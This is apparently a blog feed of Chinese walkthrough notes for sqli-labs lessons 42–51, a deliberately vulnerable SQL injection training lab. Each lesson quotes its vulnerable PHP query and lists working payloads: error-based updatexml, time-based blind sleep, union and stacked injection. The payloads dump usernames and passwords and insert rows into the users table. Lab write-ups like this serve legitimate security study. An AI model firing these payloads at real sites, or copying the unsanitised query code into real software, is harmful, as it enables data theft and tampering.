class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less51</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less51/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less51/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此关与Less50的区别为闭合方式为单引号，字符型注入，同样存在堆叠注入</p><p><a name="GxiDU"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less49</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less49/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less49/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此关的闭合方式为单引号’，还是需要时间盲注去猜解数据\ <a name="qjWYr"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1'</code> <a name="ukBAB"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length(database())=8,sleep(3),0)--+猜解数据库名称 ?sort=1'</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+猜解数据表名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20,sleep(3),0)#猜解字段名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(mid((select group_concat(username,0x7e,password) from users),1,1)='</span>D',sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less48</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less48/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less48/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>报错函数被注释了，只能用盲注的方式进行爆破</p><p><a name="ukBAB"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">8</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解数据库名称 ?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">29</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解数据表名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">20</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解字段名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'D'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less47</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less47/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less47/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>闭合方式为单引号’ <a name="qjWYr"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1</p></blockquote><p>单引号’闭合 <a name="gX6OV"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段?sort=1'</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less45</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/less45/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/less45/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=('<span class="token variable">$username</span>') and password=('<span class="token variable">$password</span>')"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试发现与Less44的区别为闭合方式为**’)  ** <a name="Ehstz"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度-1<span class="token string">') or if(length(database())=8,sleep(5),0)#猜解数据库名称 -1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度-1<span class="token string">') or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#猜解数据表名称-1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度-1<span class="token string">') or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20,sleep(5),0)#猜解字段名称-1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容-1<span class="token string">') or if(mid((select group_concat(username,0x7e,password) from users),1,1)='</span>D',sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="jCJOl"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less44</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less44/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='<span class="token variable">$username</span>' and password='<span class="token variable">$password</span>'"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试发现没有了报错回显，那就只能借助盲注的方式进行注入了</p><p><a name="Ehstz"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p><a name="jCJOl"></a></p><h2 id="拆解数据库名称长度"><a href="#拆解数据库名称长度" class="headerlink" title="拆解数据库名称长度"></a>拆解数据库名称长度</h2><p><code>-1' or if(length(database())=8,sleep(5),0)#</code> <a name="kObnI"></a></p><h2 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h2><p><code>-1' or if(ascii(mid(database(),1,1))&lt;=135,sleep(5),0)--+</code> <a name="bZUJF"></a></p><h2 id="猜解数据表名称长度"><a href="#猜解数据表名称长度" class="headerlink" title="猜解数据表名称长度"></a>猜解数据表名称长度</h2><p><code>-1' or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(5),0)#</code> <a name="kSZVm"></a></p><h2 id="猜解数据表名称"><a href="#猜解数据表名称" class="headerlink" title="猜解数据表名称"></a>猜解数据表名称</h2><p><code>-1' or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='e',sleep(5),0)--+</code></p><p><a name="j47RV"></a></p><h2 id="猜解字段名称长度"><a href="#猜解字段名称长度" class="headerlink" title="猜解字段名称长度"></a>猜解字段名称长度</h2><p><code>-1' or if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20,sleep(5),0)#</code> <a name="qszZ6"></a></p><h2 id="猜解字段名称"><a href="#猜解字段名称" class="headerlink" title="猜解字段名称"></a>猜解字段名称</h2><p><code>-1' or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='i',sleep(5),0)--+</code> <a name="aRdmK"></a></p><h2 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h2><p><code>-1' or if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(5),0)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less43</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less43/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/less43/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username=('<span class="token variable">$username</span>') and password=('<span class="token variable">$password</span>')"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与Less42不同的是闭合方式为’) <a name="VZI6o"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p><code>');insert into users values(98,'zhong','zhong')#</code></p><p><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code> <a name="jykDm"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>login_user=admin&amp;login_password=admin'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’admin’’’ at line 1</p></blockquote><p><a name="Os6ES"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表-1<span class="token string">') or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名-1<span class="token string">') or updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段login_password=-1'</span><span class="token punctuation">)</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less42</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less42/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$username</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username='<span class="token variable">$username</span>' and password='<span class="token variable">$password</span>'"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这关的注入点在密码登陆处，同时也存在堆叠注入 , 单引号闭合 <a name="I3o7P"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p><code>';insert into users values(98,'zhong','zhong')#</code></p><p><code>-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><p><a name="jykDm"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>login_user=admin'&amp;login_password=admin'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’admin’’’ at line 1</p></blockquote><p><a name="Os6ES"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表-1<span class="token string">' or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +爆破数据表-1'</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名-1<span class="token string">' or updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),0x7e),1) -- +爆破字段login_password=-1'</span> or updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token 